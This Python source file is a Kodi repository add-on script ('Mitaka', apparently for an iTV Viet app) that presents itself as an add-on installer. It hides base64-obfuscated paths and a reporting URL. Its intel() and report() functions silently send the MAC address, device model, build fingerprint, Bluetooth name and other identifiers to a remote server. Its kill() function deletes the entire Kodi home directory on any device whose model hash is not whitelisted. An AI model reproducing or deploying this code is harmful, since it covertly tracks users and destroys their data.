#!/usr/bin/env python
# -*- coding: utf-8 -*-

import xbmc, xbmcgui
import os, shutil, distutils.dir_util
import base64, hashlib, json, platform, re, requests, subprocess, sys, urllib, urllib2

script   = 'Mitaka'
rsrc     = xbmc.translatePath('special://home/addons/repository.mitaka/resources/')
src      = xbmc.translatePath('special://home/addons/repository.mitaka/')
dst      = xbmc.translatePath('special://home/')
id       = os.path.join(dst, base64.urlsafe_b64decode('dXNlcmRhdGEvRGF0YWJhc2UvRmluZ2VycHJpbnQuZGI='))
idx      = os.path.join(dst, base64.urlsafe_b64decode('dXNlcmRhdGEvRGF0YWJhc2UvTWlzc2luZw=='))
url      = base64.urlsafe_b64decode('aHR0cDovL3NlbnRyeS5pdHZ2aWV0LmNvbS9zcHkz')

friendly = [
'9e6ffefdcea6f239f5cde62264e5b6e14308fabd8cd76566cf169a81f4fed2eb86d389818782ed08e05bb90f0c9416f82fb4671678966e6a2ada836ea17ac482', # iT
'7b0b77de353ecd1df21cb32ee77b96e966933968ed58c67aa21deecdf1e0ba1ea714cdc3c11d9039f16d6c3a1b39919be4a7faeb671056f491585f59e657b00a', # i T
'ed6b2dd43dc520a21c4d92f28174e1f0ba0996c55516e6661f351fcea2502269b83e45e9d385228b8a1d6208f0c127378b762e876a5e2e5294152d4858948510', # IT
'a7e06d81717d6236d5aa8515bf1c2755063c39e4de5ab361d276d08aba42ac02e8572c7e0cbe662b23c9c88e5eb59135f8a2f427533f9eebfd93b8242a415db8', # I T
'31dd5457e8029188d3fe7c070280bdf477eb2c48bf441f8c323270bc05759ca7a723c2d7783b3cab89afee436b021909befbe1cc818f433ba6028a421f8e7de7', # it
'e20416cbe4b0e1c04a9cb54ec736bcbffeacc092f31cc81cb21c00a090d3297ff58dc326232193ab405fcb4bdfbc6d0c749c54a6c047b19b88e097e97f846421'  # i t
]
models = [
'1d8c4ece2520039f5f0928ba0d8b8f3f01dfc426ec2db07e57fe36992a3d4a18dcdd13cce4659bddddd34410a530628752f69a006b58ff3215c7e4576f41dc75', # Q
'7982c07f5eacf0b40b773ade397af5d86875aa87e5b21c68269e5c5aca00b3f46ff0539bc5b4359a8b9381a34a770ae346f76a6a1f94ba19be3987b06108f71d', # 1
'83db8a25715370079a0c12fc3ff2863e0a572e5457298ce5b300aec32fb43704bbdec6247be051a27aeb637aa57541fd23b4ce6b47c5a950930832120d0d7575', # 4
'6fc4b9e7970d2570786a47aa024c250a700947e347a05cfec46587fca6301199cbe5d6fc4316e411b8c0b007682256d230c01c5e15ab953fc2aa40d2e5dd338b', # 4-2
'4799a28e17d8e95901e5058236c4f46e9077dcfbaa69f7f6c7f26c0381718b483bd6ab9e560e79efafba107f0c43b2bedbf00a33e58424ae09bdf269ab79cb09', # R
'bdd769143d828f3d043a348bc6d2a5a58b374706c875897758e4f2e5af993929feec2bc08818e264fd3ecb604097b73dce846623049a38ff37bc2eead0468544'  # RS
]

####################################################################################################

try:
	mac = open('/sys/class/net/eth0/address').read(17).upper()
except:
	while True:
		mac = xbmc.getInfoLabel ('Network.MacAddress').upper()
		if re.match('[0-9A-F]{2}([-:])[0-9A-F]{2}(\\1[0-9A-F]{2}){4}$',mac):
			break

####################################################################################################

def miniIntel():
	platform_system      = platform.system().rstrip('\n')
	if platform.system() == 'Linux':
		try:
			model        = subprocess.Popen(['/system/bin/getprop', 'ro.product.model'], stdout=subprocess.PIPE).communicate()[0].rstrip('\n')
		except:
			device       = 'Unknown'
	else:
		model            = '...'
	return model

def intel(status,missing,hash):
	xbmc_friendlyname    = xbmc.getInfoLabel('System.FriendlyName')
	xbmc_buildversion    = xbmc.getInfoLabel('System.BuildVersion')
	platform_system      = platform.system()
	platform_release     = platform.release()
#	system_kernelversion = xbmc.getInfoLabel('System.KernelVersion')
	platform_machine     = platform.machine()

	if platform.system() == 'Linux':
		try:
			model             = subprocess.Popen(['/system/bin/getprop', 'ro.product.model'], stdout=subprocess.PIPE).communicate()[0]
			brand             = subprocess.Popen(['/system/bin/getprop', 'ro.product.brand'], stdout=subprocess.PIPE).communicate()[0]
			device            = subprocess.Popen(['/system/bin/getprop', 'ro.product.device'], stdout=subprocess.PIPE).communicate()[0]
			board             = subprocess.Popen(['/system/bin/getprop', 'ro.board.platform'], stdout=subprocess.PIPE).communicate()[0]
			manufacturer      = subprocess.Popen(['/system/bin/getprop', 'ro.product.manufacturer'], stdout=subprocess.PIPE).communicate()[0]
			build_id          = subprocess.Popen(['/system/bin/getprop', 'ro.build.display.id'], stdout=subprocess.PIPE).communicate()[0]
			build_description = subprocess.Popen(['/system/bin/getprop', 'ro.build.description'], stdout=subprocess.PIPE).communicate()[0]
			build_fingerprint = subprocess.Popen(['/system/bin/getprop', 'ro.build.fingerprint'], stdout=subprocess.PIPE).communicate()[0]
			bluetooth         = subprocess.Popen(['/system/bin/getprop', 'net.bt.name'], stdout=subprocess.PIPE).communicate()[0]
		except:
			device = 'Unknown'
	else:
		model             = '...'
		brand             = '...'
#		device            = '...'
		board             = '...'
		manufacturer      = '...'
		build_id          = '...'
		build_description = '...'
		build_fingerprint = '...'
		bluetooth         = '...'
		if platform.system() == 'Darwin':
			try:
				device = subprocess.Popen(['/usr/sbin/sysctl', '-n', 'machdep.cpu.brand_string'], stdout=subprocess.PIPE).communicate()[0]
			except:
				device = 'Unknown'
		else:
			device = platform.processor()

	data = {
	'id'                   : id,
	'idx'                  : idx.rsplit('/',1)[1],
	'status'               : status,
	'missing'              : missing,
	'mac'                  : mac,
	'script'               : script,
	'xbmc_friendlyname'    : xbmc_friendlyname,
	'xbmc_buildversion'    : xbmc_buildversion,
	'platform_system'      : platform_system.rstrip('\n'),
	'platform_release'     : platform_release.rstrip('\n'),
#	'system_kernelversion' : system_kernelversion.rstrip('\n'),
	'platform_machine'     : platform_machine.rstrip('\n'),
	'model'                : model.rstrip('\n'),
	'brand'                : brand.rstrip('\n'),
	'device'               : device.rstrip('\n'),
	'board'                : board.rstrip('\n'),
	'manufacturer'         : manufacturer.rstrip('\n'),
	'build_id'             : build_id.rstrip('\n'),
	'build_description'    : build_description.rstrip('\n'),
	'build_fingerprint'    : build_fingerprint.rstrip('\n'),
	'bluetooth'            : bluetooth.rstrip('\n'),
	'hash'                 : hash
	}
	return json.dumps(data)

####################################################################################################

def sentry(status,missing):
# ID
	if os.path.isfile(id):
		f = open(id, 'r')
		hash = f.read()
		f.close()
	else:
		hash = hashlib.sha512(mac).hexdigest()
# REPORT
	try:
		response = report(status,missing,hash)
	except:
		pass

def report(status,missing,hash):
#	r = requests.post(url=url, data=intel(status,missing,hash), auth=(username, password), headers={'Content-type': 'application/json; charset=UTF-8', 'Accept': 'text/plain'})
	r = requests.post(url=url, data=intel(status,missing,hash), headers={'Content-type': 'application/json', 'Accept': 'text/plain'})

def record(datab,hash):
	f = open(datab, 'w')
	f.write(hash)
	f.close

####################################################################################################

def deploy():
	#
	# Copy folders ----------------------------------------------------------------------------------------------------
	#
	if os.path.isfile(os.path.join(rsrc, 'addons.txt')):
		with open(os.path.join(rsrc, 'addons.txt')) as cf:
			cfolders = cf.read().splitlines()
		cf.close()

		for i in range(len(cfolders)):
			# Avoid mistakenly overwriting important files ***
			if all(cfolders[i] != a for a in('', ' ', '.', '/', 'addons', '/addons', 'addons/', '/addons/', 'userdata', '/userdata', 'userdata/', '/userdata/', 'userdata/addon_data', '/userdata/addon_data', 'userdata/addon_data/', '/userdata/addon_data/')):
				if os.path.isdir(os.path.join(dst, cfolders[i])):
					pass
				else:
					try:
						shutil.move(os.path.join(rsrc, cfolders[i]), os.path.join(dst, cfolders[i]))
					except:
						pass
	#
	# Deletes addon cache ----------------------------------------------------------------------------------------------------
	#
	try:
		os.remove(os.path.join(dst, 'userdata/Database/Addons16.db')) # KODI 14
		os.remove(os.path.join(dst, 'userdata/Database/Addons19.db')) # KODI 15
		os.remove(os.path.join(dst, 'userdata/Database/Addons20.db')) # KODI 16
		os.remove(os.path.join(dst, 'userdata/Database/Addons22.db')) # KODI 17
	except:
		pass
	#
	# Quits program ----------------------------------------------------------------------------------------------------
	#
	if android:
		app_id = APP_ID()
		try:
			xbmcgui.Dialog().ok('NOTICE', 'Please re-open iTV Viet app to download updates...')
			subprocess.call([cmd_+'/system/bin/am force-stop '+app_id+_cmd], executable='/system/bin/sh', shell=True)
		except:
			pass
	else:
		xbmc.executebuiltin('Quit')

def APP_ID():
	xbmcfolder=xbmc.translatePath(dst).split('/')
	found = False
	i = 0
	for folder in xbmcfolder:
		if folder.count('.') >= 2 :
			found = True
			break
		else:
			i+=1
	if found == True:
		app_id = xbmcfolder[i]
		return app_id
	else:
		return None

####################################################################################################

xbmc_friendlyname    = xbmc.getInfoLabel('System.FriendlyName')
platform_release     = platform.release().rstrip('\n')
android              = xbmc.getCondVisibility("System.Platform.Android")
windows              = xbmc.getCondVisibility("System.Platform.Windows")
model                = miniIntel()

####################################################################################################

def kill():
	if hashlib.sha512(model).hexdigest() not in models:
		try:
			shutil.rmtree(dst,ignore_errors=True)
		except:
			pass

####################################################################################################

status  = 0
missing = ''

with open(os.path.join(src, 'src')) as cf:
	cfolders = cf.read().splitlines()
cf.close()

for i in range(len(cfolders)):
	cfolders[i] = base64.urlsafe_b64decode(cfolders[i])
	if not os.path.isdir(os.path.join(dst, cfolders[i])):
		status -= 1
		missing = missing + cfolders[i] + ' '

if (status < 0):
	sentry(status,missing)
	record(idx,'0')
	if hashlib.sha512(model).hexdigest() in models or hashlib.sha512(xbmc.getInfoLabel('System.FriendlyName')).hexdigest() in friendly:
		deploy()
	else:
		kill()

elif (status == 0):
	try:
		os.remove(idx)
	except:
		pass

####################################################################################################
